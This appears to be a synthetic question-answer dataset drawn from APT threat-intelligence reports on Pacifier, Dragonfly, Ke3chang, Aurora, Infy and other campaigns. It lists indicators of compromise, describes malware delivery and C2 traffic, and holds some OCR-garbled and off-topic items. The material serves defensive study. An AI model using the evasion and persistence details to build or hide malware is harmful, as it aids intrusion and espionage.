    "output": "Operation ShadowCat employs several sophisticated techniques to evade detection. The attack begins with a deceptive shortcut (.LNK) file that, when executed, runs a PowerShell command. This command drops a malicious .NET loader file and a decoy Word document onto the victim's machine. The PowerShell script then invokes methods within the .NET file to retrieve a steganographic PNG image from a remote server. This image contains a Gzip-compressed payload, which is subsequently decompressed and injected into the PowerShell.exe process. By executing these actions entirely in memory, the attack avoids detection by traditional security products. The key components involved in this process include the initial .LNK file, the PowerShell script, the .NET loader file, the steganographic PNG image, and the final payload, which is a Remote Access Trojan (RAT) written in the Go programming language.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What insights can be drawn from the PDB path found in the 'MyHNServer' malware sample, and how does it relate to other activities by the actor using htpRAT?",
    "output": "The PDB path found in the 'MyHNServer' malware sample includes the folder name '\u5df4\u54e5\u7ec4,' which translates to 'elderly' or 'brother' group, likely referring to a senior or experienced group within the attacker's organization. This PDB path correlates with other samples, including 'MyCL,' which uses the C2 server 'data.dubkill.com.' This domain has been used in attacks in Vietnam and is registered to an email address linked to other malicious activities, such as imitating the official military domain in Vietnam. The shared infrastructure and registration information reveal a broader web of operations by the adversary, highlighting the extent and complexity of their activities beyond the use of htpRAT.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: IOCs\nFile paths\n%APPDATA%\\Microsoft\\Word\\MSWord.exe\n%APPDATA%\\Axpim\\ubfic.exe (random)\n%TEMP%\\ntlm.exe\n%TEMP%\\msvci.dll\n%TEMP%\\msvcp.dll\n%TEMP%\\msvck.dll\n%TEMP%\\msvct.dll\n%TEMP%\\msvci.exe   (64bit)\n%TEMP%\\msvck60.dll (64bit)\n%TEMP%\\msvct60.dll (64bit)\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\dws.exe\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi.exe\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi32.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msi60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msk.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msk60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msp.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msp60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\mst.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\mst60.dll\n%APPDATA%\\Microsoft\\VisualStudio\\11.0\\msvci60.dll\n%APPDATA%\\Axpim\\selfdel.bat\n%TEMP%\\xmlupd.bat\npipes\n\\\\.\\pipe\\bc367\n\\\\.\\pipe\\bc31a7\nRegistry paths\nHKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostUpdate -> %TEMP%\\ntlm.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\ntlm.exe\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\svchostUpdate  -> %TEMP%\\svchost.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\svchost.exe\nHKLM\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\\dwm service  -> %TEMP%\\dwms.exe\nHKCU\\Software\\Microsoft\\Windows NT\\CurrentVersion\\Windows\\Devices -> %TEMP%\\dwms.exe\nHKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\\dwupdate -> %APPDATA%\\Microsoft\\VisualStudio\\11.0\\dws.exe\nBig Headline: SHA1 hashes of all known variants\n0641f22e1b4e15cc23660b2e8bbf42623e997dfb 0af1a6d6c487e78aa252ae2f5921606a8a379206 100241519698bb013f668ff49d3d0d4fdab6a584 14014f810a0c07b6dde48b7a8954b56c409ae7f3 16c6d317fd7c361623c62cf5652a6b7937f58e0a 22c565e2cfb8adadd022b0ec281bb2b6ed62dca2 23ce92fd1d4d2d42389a66869434fb578aa3f539 261a8fc8e0e396298120a7bc15c32a37f3ce5b94 2a9c8639215faf08593f17b930f83757324dfbee 2ad7262ad52320399aa54cd8482c30e7a480bebc 2eb5a075b710155c409e727e7f74fdc3be63b58c 325b1075b4544ecc2c5741a7a06a9df00f0965da 336d5957909487990033a3432d0347be34db044a 368b746daf5448812b231aed67bd795dfb5a605d 38d16c19b54bf2c94e0ad81fca207de062181b31 4880a13c4e1cde0343c233f5e107abf4e3d00664 49f0569886e5e6ba4b32b7f118dc35f9e5916dc2 4eecebf5c9720c8e85347e0dcf55a844a6d01b08 5374b898dbb618aa84d92f7a3e9d166e9e819960 54ac8caeae8046e01301379602041c74ee527dfc 5617c1414cb79411c64883ee72d219d52123fa30 583036a7c9b210508c222c7dfdd9b8321feca7df 58952be65d0ed53490f69f566485c699f246dcc0 5a6b14fad221ab65a086b1ee7c97eb63ff38480e 5aaa055fa5eb9a436ca0e643bf2ada268bcd6f33 5bcc6da122b3aa88c766d80eb7774c2c6e9e25d5 623185a651a1962538141d7ffefdc2f2445a9201 66a7642abaf3d05d5ab14e83dfd52eca0c17acc6 67e9e098c2b39b5847f6cd3aa5a3f86917602f5f 6a2d12adc541c9c5aaa1096d7e59c72c489cdd59 713855aa5680154324bfcbac638aa1c12681e3c3 7674f680fd0c24c222c027976c40ffe1e08c6f2e 7abf407b9a19dd9ee528fa6e5a099ea1c8ba2f98 80091e1b7b4dd404c83a9c54fda9e6951b2689b1 852dc73ca9e6d92b3da96500d27ab44b7f9a4ea4 85c03c6fa5e3803e55a46f17d6981992181de57b 88af035dc34f730c884b5a11c8be666974a1a6eb 88fd1ee6fb78385a1c5e462dd0768bc34b8188a3 8c4dd73cdd48908ddf5039c5a99e719dfd44ff41 8d40a65a2bca1378eb6e009c1842aa0e45ae289e a5359856742d09d1596e5c7fde407856d72046db a9239572afe4fbdfe077a262c9699eb1d22a9c87 acc2250be782063f268b87bd0f798549c5838b95 aecf66120861b71c92a2d1f0015fc9228c02ee88 b2700f16e4494ef7eba26b88a800728621adffea b4afc5e0002201ce052466cba9061018474b1de0 b55dac24f646dd5e0ea856d6ed7891ad8c8acdc1 b84ef6480d888b560b071e1f97e78f06080dae89 c340534b8eafed85fc6e9950033b0b9e696d5cb0\nc4b06021c6c925c837dab3ba42c6b76eb77ad30b c5166d1a574bc5e374490846f2584f94f755d90b c9b1208be2aa2c5cfbcbfcb9b1a45c36854414b8 ce234ed0899c8f97e3f2085215b842723a773368 d80d5ccb9d37d971a408d3c91f803e40b8421a2c d83d7de186fa6c7abe4676eb568ba4dc62a7c931 e20b0f03f6708118bca9f408b156b210ba083b54 eacadedc31af04ef86470aec62ad3eccc9a35332 eb0f02e36e77221366becabc60e78dd43368ab9d eb1b83825ff28de7f13812bfce273ad7fb1994fb ede8ec9f3efeb515859becd1f430f82933b42dd9 edf96c42f4e1cf43fbaab3f0bbf54280fc8e311d eea9fec97dca5d122069adf6dd71628bd6d9c2fd f9af4a51616db485adc577ad600b60e77916cace fbd538cf432f2576b37e2770f860b70b009c3cf3 01e2e16be5828ca03c6b78f253bd962bfaa5ccbf 09df1b0abd32791c3b0d5d657cd956f81e2dacb2 0a9dd2b71df68ba088d7d868d7e191875755e34c 14b6f2bc2b869d3417619201c7205e240a93d2ef 1ae10d6ec5d33b704c32ef52c3ee9671f4298d5f 1e49924afe56e3c782893118a51256ca5f247fba 23d5cc54641f56f554890bbd55d580e5c564e197 26f8d64038439c006f12ec34b035b1dee1c56b31 272c42bcdcc88adba1e01e60a931fbe5f5800883 2a84f90ed23a569defee7b37f4650aca4021a767 2bf06a003a9bd56d2ed91770966a7aee7d9784b9 321ca51b4c250515bc3075abe735e360a57dee22 33f57151a52666ca055f1dc66ef04e2f9cb09918 3e10fd3e8d4c4a7900e603aee7660c83441d998e 3fbaf98c75992db9db11d29ae20c13b7b0f50470 443551d822eba6a81b8ac3177e31e210c99934d0 45c7f3f065cf015289ab17161a1880eb638b508a 46f1b8722f8f094015c749599e94a3e44850df0a 4f35665e689bea4f116505f81ae2906fd1517128 547f525f57f3f47222ae3ab253635df936bd355a 585550816539b73dfdc3cee80cc60e1cdc1cdb3e 5d492ae763bfc227db9eea46e560124128ff925b 5ff776d23e6c6af47619ad2e7333a434b79e19df 621698f821a2bafccad026f9f5d2fe1ac46a39ce 66ec04c005d0a1ebc218455915e31d2a2b6dd459 686ada60c898782b57ca993141b64f7c7a531c50 6c68a9df2d710187d067ecb2d0cc04358d570b52 6e070e01076a4a92f08924a405f389436003d927 78499e4694f847972576960a04f8177691a7c911 840563929f13ab05e45a8d3fb2d11e70e3cdccca 840de34aa767131eb34069e6f936dea3a48c024e 85a6e3a3fcee71ffa2aad90336960132fa8f4c4d 88f473f3d7a7eb2637754a8d0856ab888066ab08 8f8d7cd742fb843ba8cb16c2b2d6349436049ed8\n8ffd436182f8d2a7ec0a66c0d6d43f71222f62b5 92731e4ed149c59a25c233635c55a87a8a22b19f 96d9cf7296f02bf4e49c0540fb84981493b61a93 9957af2dbfa04bca2a5319a216852ce4f4a17682 9b0effd20ea7239275b6cf1e02280eb67eced701 a5daecfd57f006acd15486bd544f40e4cdce3801 a753de6b2e6d3d5735fc5e90a879f1ad7e93fb0f b0b9215e236bb47f5f0a108be97b24d20898d2fc b35b07ad4f42493ecb19f66aba83da8e74c1bb5a b4e867893d9d6f8b52de98ab6b41513d61f20472 ccf0a302eb264cbb5db726d61ad18ebdc0d3d012 d53eb2a6904d1fb7982bb876916cd3723c3dc9b1 d6d3d9a56513b83db497a8d4701c2ac7270d78eb d7218e80261517badd8090d3a5ba0a1ed21c21a2 d74d8ec530c02b1eb94203de1f641e15a72faf8d e32832e3f0e0b8450e7bdded16c441951b171130 eda30afac2c1fa0ed2c80e8859e2556ea3dfe2ef ee1f5ba06400fa192664f984d71b1a0cdba96d75 f781e603c55558708ac3101d0bfee2c1752693c2 fdb9d026502aa64aa23b1acb96f6d0013ef874b4\nb719e1d03e860235a68dda4168f29ac4988d25de ba29c29a35d15a668ea2ea79d1d4e56c2d67553f bca5accb9f1d0806f8603cf74ce0ebe9519f5004 be10c837af1f25ee67440f3a33da8c650f5ab54a c34a68c1a2d2beddbbe8ee8bd125cce14d0dc377 c3bc94b065449879c25a541d740346e060d9d6fe c414ba1dd1f281a63e58c60eb1d8cb4ac3c4e7f0 c7accc1c4ceedc756c30ebb2f1ff9f0dbd0255b0 c8395601ea301ba083cb530dad7a44c8048eeb77 ca07bbfc5e8c15c4258f92e6e6c328b86b7b19a5\nSmall Headline: International politics\nText is a Bloomberg news story from October 24th: Bulgaria, Romania and Serbia Ready to Close Borders for Migrants.\nBudget plan template\nThis one looks as a budget calculation template taken from \"Relations internationals et Francophonie\" of Quebec.\nFiche BUDGET G.LOBAl ,do projet \u2022Format sugg,ere. Les oepenses et reve.ntJ.s IM.iqu-es d-dl!!!.sou-s ne Je S-DJ1t .qu'A ti [!Jormes_d u proara m meP-our con naittre les. depen ses adm Issi bles, vol r document adml:s-slbles 4\nTITRE DU PR,QJ ET' :\u00b7\nBig Headline: PARTIE FRANCAJ'SE\nBitdefender is a global security technology company that delivers solutions in more than 100 countries through a network of value-added alliances, distributors and reseller partners. Since 2001, Bitdefender has consistently produced award-winning business and consumer security technology, and is a leading security provider in virtualization and cloud technologies. Through R&D, alliances and partnership teams, Bitdefender has elevated the highest standards of security excellence in both its number-one-ranked technology and its strategic alliances with the world's leading virtualization and cloud technology providers. More information is available at http://www.bitdefender.com/\nAll Rights Reserved. \u00a9 2015 Bitdefender. All trademarks, trade names, and products referenced herein are property of their respective owners. FOR MORE INFORMATION VISIT: enterprise.bitdefender.com\nBD-Business-Jun.30.2016-Tk#: 70585\nQuestion: In the context of the Pacifier APT, what file paths were used by the malware to store its components, and how does this information help in detecting and mitigating such attacks?",
    "output": "Answer: The Pacifier APT used specific file paths to store its components, including %APPDATA%\\\\Microsoft\\\\Word\\\\MSWord.exe, %APPDATA%\\\\Axpim\\\\ubfic.exe, %TEMP%\\\\ntlm.exe, and various others listed under the 'File paths' section. This information is crucial for detecting and mitigating such attacks because it allows security professionals to monitor these paths for unusual activity. By knowing where the malware typically stores its files, defenders can set up alerts and automated responses to block or quarantine suspicious files, thereby preventing the malware from executing its payload.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: What conditions must be met for a non-international armed conflict to be reclassified as an international armed conflict, particularly in the context of the Russo-Ukrainian conflict?",
    "output": "For a non-international armed conflict to be reclassified as an international armed conflict, a state must actively participate or exercise 'overall control' over the separatists. This involves not only financing, training, equipping, or providing operational support to local forces but also having a role in organizing, coordinating, and planning their operations. In the case of the Russo-Ukrainian conflict, if Russia actively participates or exercises such control over the Donetsk and Luhansk separatists, the conflict could be considered international.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: Strong links with earlier campaigns\nThere are a number of indicators linking recent activity with earlier Dragonfly campaigns. In particular, the Heriplor and Karagany Trojans used in Dragonfly 2.0 were both also used in the earlier Dragonfly campaigns between 2011 and 2014.\nTrojan.Heriplor is a backdoor that appears to be exclusively used by Dragonfly, and is one of the strongest\nindications that the group that targeted the western energy sector between 2011 and 2014 is the same group that is behind the more recent attacks. This custom malware is not available on the black market, and has not been observed being used by any other known attack groups. It has only ever been seen being used in attacks against targets in the energy sector.\nTrojan.Karagany.B is an evolution of (<https://www.symantec.com/security_response/writeup.jsp?docid=2010-121515-0725-99>)Trojan.Karagany, which was previously used by Dragonfly, and there are similarities in the commands, encryption, and code routines used by the two Trojans. Trojan.Karagny.B doesn't appear to be widely available, and has been consistently observed being used in attacks against the energy sector. However, the earlier Trojan.Karagany was leaked on underground markets, so its use by Dragonfly is not necessarily exclusive.\nFigure 2. Links between current and earlier Dragonfly cyber attack campaigns\nBig Headline: Potential for sabotage\nSabotage attacks are typically preceded by an intelligence-gathering phase where attackers collect information about target networks and systems and acquire credentials that will be used in later campaigns. The most notable examples of this are Stuxnet and Shamoon, where previously stolen credentials were subsequently used to administer their destructive payloads.\nThe original Dragonfly campaigns now appear to have been a more exploratory phase where the attackers were simply trying to gain access to the networks of targeted organizations. The Dragonfly 2.0 campaigns show how the attackers may be entering into a new phase, with recent campaigns potentially providing them with access to operational systems, access that could be used for more disruptive purposes in future.\nThe most concerning evidence of this is in their use of screen captures. In one particular instance the attackers used a clear format for naming the screen capture files, [machine description and location].[organization name]. The string \"cntrl\" (control) is used in many of the machine descriptions, possibly indicating that these machines have access to operational systems.\nNumerous organizations breached in six-year campaign against the energy sector #dragonfly\nBig Headline: Clues or false flags?\nWhile Symantec cannot definitively determine Dragonfly's origins, this is clearly an accomplished attack group. It is capable of compromising targeted organizations through a variety of methods; can steal credentials to traverse\ntargeted networks; and has a range of malware tools available to it, some of which appear to have been custom developed. Dragonfly is a highly focused group, carrying out targeted attacks on energy sector targets since at least 2011, with a renewed ramping up of activity observed in the last year.\nSome of the group's activity appears to be aimed at making it more difficult to determine who precisely is behind it:\nThe attackers used more generally available malware and \"living off the land\" tools, such as administration tools like PowerShell, PsExec, and Bitsadmin, which may be part of a strategy to make attribution more difficult. The Phishery toolkit became available on Github in 2016, and a tool used by the group\u2014Screenutil\u2014 also appears to use some code from CodeProject.\nThe attackers also did not use any zero days. As with the group's use of publicly available tools, this could be an attempt to deliberately thwart attribution, or it could indicate a lack of resources.\nSome code strings in the malware were in Russian. However, some were also in French, which indicates that one of these languages may be a false flag.\nConflicting evidence and what appear to be attempts at misattribution make it difficult to definitively state where this attack group is based or who is behind it.\nWhat is clear is that Dragonfly is a highly experienced threat actor, capable of compromising numerous organizations, stealing information, and gaining access to key systems. What it plans to do with all this intelligence has yet to become clear, but its capabilities do extend to materially disrupting targeted organizations should it choose to do so.\nBig Headline: Protection\nSymantec customers are protected against Dragonfly activity, Symantec has also made efforts to notify identified targets of recent Dragonfly activity.\nSymantec has the following specific detections in place for the threats called out in this blog:\nSymantec has also developed a list of Indicators of Compromise to assist in identifying Dragonfly activity:\nCustomers of the DeepSight Intelligence Managed Adversary and Threat Intelligence (MATI) service have previously received reporting on the Dragonfly 2.0 group, which included methods of detecting and thwarting the activities of this adversary.\nBig Headline: Best Practices\nDragonfly relies heavily on stolen credentials to compromise a network. Important passwords, such as those with high privileges, should be at least 8-10 characters long (and preferably longer) and include a mixture of letters and numbers. Encourage users to avoid reusing the same passwords on multiple websites and sharing passwords with others should be forbidden. Delete unused credentials and profiles and limit the number of administrative-level profiles created. Employ two-factor authentication (such as (<https://vip.symantec.com/>)Symantec VIP) to provide an additional layer of security, preventing any stolen credentials from being used by attackers.\nEmphasize multiple, overlapping, and mutually supportive defensive systems to guard against single point failures in any specific technology or protection method. This should include the deployment of regularly updated firewalls as well as gateway antivirus, intrusion detection or protection systems (IPS), website vulnerability with malware protection, and web security gateway solutions throughout the network.\nImplement and enforce a security policy whereby any sensitive data is encrypted at rest and in transit. Ensure that customer data is encrypted as well. This can help mitigate the damage of potential data leaks from within an organization.\nImplement SMB egress traffic filtering on perimeter devices to prevent SMB traffic leaving your network onto the internet.\nEducate employees on the dangers posed by spear-phishing emails, including exercising caution around emails from unfamiliar sources and opening attachments that haven't been solicited. A full protection stack helps to defend against emailed threats, including (<https://www.symantec.com/products/email-security-cloud>)Symantec Email Security.cloud, which can block email-(<https://www.symantec.com/products/messaging-gateway>)borne threats, and , which can block malware on the endpoint. Symantec Messaging Gateway's Disarm technology can also protect computers from threats by removing malicious content from attached documents before they even reach the user.\nQ: How does the use of screen captures in the Dragonfly 2.0 campaign indicate a potential for sabotage? Provide details on the naming convention and its significance.",
    "output": "The use of screen captures in the Dragonfly 2.0 campaign indicates a potential for sabotage because the attackers used a specific naming convention for the screen capture files, such as '[machine description and location].[organization name]'. The string 'cntrl' (control) in many of the machine descriptions suggests that these machines have access to operational systems. This implies that the attackers are gathering information about critical systems, which could be used for more disruptive purposes in the future. This intelligence-gathering phase is typical of sabotage attacks, where stolen credentials and system access are used to administer destructive payloads.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Write an answer to the following question: How did the BMW malware, the earliest iteration used by Ke3chang attackers, communicate with its CnC server, and what data was included in the Base64 encoded POST body?",
    "output": "The BMW malware communicated with its CnC server using a fake HTTP traffic pattern: POST /<filename>.aspx?Random=<16 Random Alphabet Characters> HTTP/1.1. The <filename> in the URI was randomly chosen from hard-coded entries within the malware binary, such as 'acheb.aspx', 'bajree.aspx', 'cyacrin.aspx', 'dauber.aspx', and 'eaves.aspx'. The Base64 encoded data in the POST body decoded to include information such as the local IP address, computer name, domain, browser version, mail client, campaign marker, date/time, proxy enable/disable status, whether the malware was running inside a virtual machine, the number of bytes last downloaded from the download file command, volume serial number, and the last command executed.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Big Headline: How can I tell if my systems were infected?\nIf you are a McAfee VirusScan Engine customer, verify that you are using .DAT 5864 released on January 18, 2010 (McAfee has provided protection to identify this as of release 5862 and is updating as we continue to debug the attack) and perform a full scan on all machines within your enterprise, starting with most sensitive servers. If you detect the following signatures triggered: Exploit-Comele, Roarur.dr or Roarur.dll, you very likely have an infected Aurora host and should reach out to, our vulnerability management and protection services division, for onsite Incident Response Services. You may also take advantage of product, used to clean up an Operation Aurora-infected system.\n\nWhy was it crucial for McAfee VirusScan Engine customers to use .DAT 5864 released on January 18, 2010, and what specific signatures indicated an infection by the Aurora APT?",
    "output": "A: It was crucial for McAfee VirusScan Engine customers to use .DAT 5864 released on January 18, 2010, because this update provided enhanced protection against the Aurora APT. McAfee had initially provided protection starting from release 5862 but continued to update as they further debugged the attack. Specifically, if the following signatures were detected during a full scan: Exploit-Comele, Roarur.dr, or Roarur.dll, it strongly indicated that the system was infected by the Aurora APT. This information was critical for identifying compromised systems and initiating appropriate incident response measures, including reaching out to McAfee's vulnerability management and protection services division for onsite Incident Response Services.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Medium Headline: Phase 1\nWe observed referral traffic begin on June 25, 2012 to the exploit site. However, according to the server logs, actual exploitation of Internet Explorer began on July 9, 2012 at approximately 7:56 AM EST when the first successful exploits of visiting browsers began to hit the exploit code. We observed some movement of exploit code across directories on the *******curling.com web server during the investigation, so this gap was likely caused by the attacker setting up a new campaign. Phase 1 exploit activity continued over the course of two days, with continuous access, until July 10th, when activity stopped at 3:43 pm EST.\nMedium Headline: Phase 2\nPhase 2, which consisted of the above mentioned attack on the Sun Java client, began on July 16, 2012, when the first successful exploits of visiting java clients began to hit the exploit server at approximately 7:46am EST. This exploit activity continued over the course of a few days, and ceased on July 18, 2012, at approximately 9:12 am EST, which was when the server administrator of *******curling.com brought the server down for compromise remediation.\nMedium Headline: Overall Statistics\nFigure 13: Success of Compromise\nFigure 14: Top Four Redirect Sites\nBased on our analysis, a total of 32,160 unique hosts, representing 731 unique global organizations, were redirected from compromised web servers injected with the redirect iframe to the exploit server. Of these redirects, 3,934 hosts were seen to download the exploit CAB and JAR files (indicating a successful exploit/compromise of the visiting host). This gives a \u2022success\u2022 statistic of 12%, which based on our previous understanding of exploit campaigns, indicates a very successful campaign.\nTotal Exposure and Compromise\nOf the listed sites used to redirect hosts to the exploit site, the top four redirecting web servers are as follows:\nWith success rates per exploit type being split pretty much down the middle:\nMedium Headline: Exploited Organization Breakdown\nOf the hosts above that downloaded the exploit CAB and JAR files, the RSA FirstWatch team further examined compromised organizations by identifying the visiting hosts and cross-referencing the IP addresses to the Autonomous Systems that they belonged to.\nCAVEAT: Because we didn\u2022t have observation of the compromised host themselves, nor command and control traffic, our understanding of \u2022compromise\u2022 is strictly-related to observed HTTP traffic. This analysis would not take into account host or perimeter-based blocking systems at affected organizations.\nWith this data we then grouped those autonomous systems into the following industries:\n\u2022 Corporate \u2022 These systems were identified as being members of typical corporate networks, which included enterprises and business, as well as \u2022business-class\u2022 IP space in large ISP organizations.\n\u2022 Defense Industrial Base (DIB) \u2022 These systems were systems in ASNs that were known to be involved with DIB consulting, systems and process.\n\u2022 Local Government \u2022 These systems were systems in networks identified as government systems in various cities, counties and towns.\n\u2022 Internet Service Provider (ISP) - These systems were hosts in networks that were identified as common internet service provider space. This particular classification accounts largely for consumer-based internet users, but may also include corporate assets that aren\u2022t immediately identifiable by ASN examination.\n\u2022 Federal Government \u2022 These systems are hosts in U.S. Government IP space or Washington DC area local government space. This would include Federal agencies and support organizations.\n\u2022 Educational Institutions (EDU) \u2022 These systems were hosts in networks identified as educational institutions. Much like ISP traffic, this traffic is difficult to breakdown into more specific identifying information.\n\u2022 Financial Services Organizations \u2022 These systems were systems in identifiable Bank, Credit Union, Trading and other organizations related to financial services.\n\u2022 Healthcare - These systems were hosts in identifiable healthcare industry space. This would include hospital, pharmaceutical, patient services and clinic space.\n\u2022 Other Government \u2022 These systems were national government systems identified in foreign IP space or global government organizations (example: United Nations)\n\u2022 Utilities / SCADA - These systems were hosts identified in organizations that supply or support utility or SCADA-related services such as Energy and water services.\nFigure 16: Compromises by Industry\nFigure 17: Compromise by Industry without ISP\nCompromises by Industry\nBy removing ISP traffic, we are better able to examine the other industries:\nBig Headline: Conclusions\nRSA FirstWatch research has revealed an exploit and compromise campaign with connections over the past 8 months. The collected data suggests that this attack was orchestrated and carried out by threat actors commonly referred to in the industry as \u2022APT\u2022:\n1) Use of the \u2022xKungFoo\u2022 script kit for victim redirection\n2) Use of attack methodology that matches motives seen in past APT attacks \u2022 most notably such as those seen in the Aurora and GhostNet campaigns\n3) Use of the \u2022gh0st\u2022 remote access tool (RAT) in this and previous campaigns\n4) Use of command and control infrastructure in the Hong Kong area in this and previous campaigns\n5) Gross impact and on almost 900 unique organizations\n6) Targets of Interest and Opportunity being geographically disperse in addition to industrial & vertical diverse with a heavy concentration in the following areas:\n\u2022 International finance & banking\n\u2022 Technology\n\u2022 Government \u2022 municipal, state, federal and international\n\u2022 Utilities & energy\n\u2022 Educational\n\u2022 Defense Industrial Base (DIB)\n\u2022 Corporate Enterprise\nThe possibility exists that this was intentional misdirection on the part of the attackers in regards to their origin. However, the RSA FirstWatch team believes the data supports our analysis and this is further evidence of APT intrusion into United States government and corporate assets.\nBig Headline: Disclaimer\nRSA Security LLC (\u2022RSA\u2022) believes the information in this publication is accurate as of its publication date. RSA disclaims any obligation to update after the date hereof. The information is subject to update without notice. The analysis may include technical or other inaccuracies and/or typographical errors.\nTHE INFORMATION IN THIS PUBLICATION IS PROVIDED TO FOR INFORMATIONAL PURPOSES ONLY, IS PROVIDED \"AS IS,\" AND SHALL NOT BE CONSIDERED PRODUCT DOCUMENTATION OR SPECIFICATIONS UNDER THE TERMS OF ANY LICENSE OR SIMILAR AGREEMENT. RSA MAKES NO REPRESENTATIONS OR WARRANTIES OF ANY KIND WITH RESPECT TO THE INFORMATION IN THIS PUBLICATION, AND SPECIFICALLY DISCLAIMS IMPLIED WARRANTIES OF MERCHANTABILITY OR FITNESS FOR A PARTICULAR PURPOSE.\ni http://www.wired.com/threatlevel/2010/01/operation-aurora/ ii http://www.scribd.com/doc/13731776/Tracking-GhostNet-Investigating-a-Cyber-Espionage-Network iii http://googleonlinesecurity.blogspot.com/2012/06/security-warnings-for-suspected-state.html iv http://contagiodump.blogspot.com/2011/02/targeted-attacks-against-personal.html v http://thediplomat.com/flashpoints-blog/2011/06/07/china-cyber-attack-fallacies/ vi http://www.yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html vii http://www.yunsec.net/a/school/bdzs/fmuma/2010/0602/4175.html viii http://www.zdnet.com/blog/security/state-sponsored-attackers-using-ie-zero-day-to-hijack-gmailaccounts/12462ix http://www.mcafee.com/us/resources/white-papers/foundstone/wp-know-your-digital-enemy.pdf x http://www.malwaredomainlist.com/mdl.php?search=wsdhealthy.com&colsearch=All&quantity=50 xi http://www.mywot.com/en/scorecard/wsdhealthy.com xii http://www.malwaregroup.com/domains/details/wsdhealthy.com\nABOUT RSA\nRSA, The Security Division of EMC, is the premier provider of security, risk and compliance management solutions for business acceleration. RSA helps the world\u2022s leading organizations succeed by solving their most complex and sensitive security challenges. These challenges include managing organizational risk, safeguarding mobile access and collaboration, proving compliance, and securing virtual and cloud environments.\nCombining business-critical controls in identity assurance, encryption & key management, SIEM, Data Loss Prevention and Fraud Protection with industry leading eGRC capabilities and robust consulting services, RSA brings visibility and trust to millions of user identities, the transactions that they perform and the data that is generated. For more information, please visit www.RSA.com and www.EMC.com.\nEMC2 , EMC, RSA, FirstWatch, NetWitness and the RSA logo are registered trademarks or trademarks of EMC Corporation in the United States and other countries. All other trademarks used herein are the property of their respective owners. \u00a92012 EMC Corporation. All rights reserved. Published in the USA.\nwww.emc.com/rsa\n\nQ: How did the RSA FirstWatch team determine the success rate of the exploit campaign, and what does this rate indicate about the effectiveness of the attack?",
    "output": "A: The RSA FirstWatch team determined the success rate of the exploit campaign by analyzing the number of unique hosts redirected to the exploit server and the number of hosts that downloaded the exploit CAB and JAR files. Out of 32,160 unique hosts, 3,934 were successfully compromised, resulting in a success rate of 12%. This rate indicates a very successful campaign based on previous understanding of exploit campaigns.",
    "category": "apt-notes",
    "instruction_type": "retrieval1"
  },
  {
    "instruction": "Context: Big Headline: Attack Technique\nThe attacks we have identified carrying Infy begin with a spear-phishing e-mail carrying a Word or PowerPoint document. The attached document file contains a multi-layer Self-Extracting Executable Archive (SFX), and content attempting to social engineer the recipient into activating the executable. In this example, the PPS file, when clicked, opens in \"PowerPoint Show\" mode. The user sees a PowerPoint page (Figure 1) that mimics a paused movie, and is tricked into clicking \"Run\" (Figure 2), which allows the embedded SFX file to execute.\nOne of the SFX layers is encrypted with the key \"1qaz2wsx3edc\". The package (Figure 3) typically includes a fake readme.txt file as camouflage (for example, impersonating an Aptana Studio application), and in some campaigns, image or video files (Figure 4). The executable typically has a filename pattern ins[*].exe where * are random digits of up to 4 characters. The main payload is a DLL file with a typical filename pattern mpro[*].dll where * are random digits of up to 3 characters (early versions used a .cpl extension).\nThe executable installs the DLL, writes to the autorun registry key, and doesn't activate until a reboot. After reboot, it first checks for antivirus and then connects to the C2. It starts collecting environment data, initiates a keylogger, and steals browser passwords and content such as cookies, before exfiltrating the stolen data to the C2 server.\nThe initially-observed \"thanks.pps\" example tricks the user into running the embedded file named ins8376.exe which loads a payload DLL named mpro324.dll.\nBig Headline: Infrastructure\nIn our initial samples, we observed C2 servers updateserver3[.]com and us1s2[.]strangled[.]net.\nOther campaigns use a combination of Dynamic DNS providers, third-party site hosting services, and apparently first-party-registered domains as C2 servers.\nAnalysis of hosting and WHOIS data (Figure 5) led to a total of 12 related first-party-registered domains used for C2 servers:\nbestbox3[.]com\nmyblog2000[.]com\nsafehostonline[.]com\nupdateserver3[.]com\nshort-name[.]com\nbestupdateserver2[.]com\nbestwebstat[.]com\nupdatebox4[.]com\nbestupdateserver[.]com\nshort-url20[.]com\nupdateserver1[.]com\nbox4054[.]net\nAges of these domains suggest that some may have been used for malicious activity back as far as early 2010.\nWe found a (<https://fe-ddis.dk/cfcs/CFCSDocuments/Phishing uden fangst.pdf>)report by the Danish Defense Intelligence Service's Center for Cybersecurity, which had observed similar attacks against Danish Government targets, and documented a small portion of the same C2 infrastructure.\nWe initially found a file with an identical hash as the originally-observed PowerPoint file, but a different filename (\"syria.pps\"), uploaded to VirusTotal (Figure 6) also in May of 2015. A characteristic observed across these campaigns is that the actor puts deliberate effort into the specific geographic targeting, with region-specific attack content.\nWe were subsequently able to pivot and associate additional malware and campaigns based on infrastructure, hashes, strings, and payload links and similarities. The most conclusive evidence that all of these are linked is found in a single key, used to encode strings within the 